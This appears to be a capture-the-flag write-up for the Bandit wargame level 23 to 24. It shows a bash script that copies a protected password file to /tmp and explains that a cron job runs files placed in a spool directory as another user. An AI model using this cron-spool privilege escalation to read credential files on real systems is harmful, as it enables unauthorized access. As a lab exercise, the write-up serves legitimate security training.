# Bandit Level 23 → 24

## Commands

Create a script:

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit24_password
```

Then:

```bash
chmod +x getpassword.sh
cp getpassword.sh /var/spool/bandit24/foo/
cat /tmp/bandit24_password
```

## Why this works

The level's cron job executes files placed in its spool directory as `bandit24`. The script therefore reads the protected password file and writes it somewhere the current user can read.
